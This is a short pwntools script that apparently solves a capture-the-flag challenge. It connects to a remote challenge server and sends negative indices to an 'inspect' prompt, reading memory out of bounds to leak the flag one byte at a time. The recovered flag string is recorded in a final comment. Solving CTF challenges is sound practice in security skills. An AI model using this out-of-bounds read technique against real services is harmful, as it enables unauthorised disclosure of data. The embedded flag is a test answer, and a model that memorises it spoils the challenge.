from pwn import *
e=ELF("./chal")
#io=process(e.path)
io=remote("23.146.248.230", 12343)

io.sendlineafter("Enter your input:", "owo")

flag=b""
cur=0
start=-48
while(1):
    idx=start+cur
    io.sendlineafter("inspect:", str(idx))
    io.recvuntil("'")
    now=io.recv(1)
    flag+=now
    if(now==b"}"):
        break
    cur+=1
    success(flag.decode())

success(flag.decode())

io.close()
#THJCC{i_ThoU9HT_i_W@S_well_HIdDen_QQ}
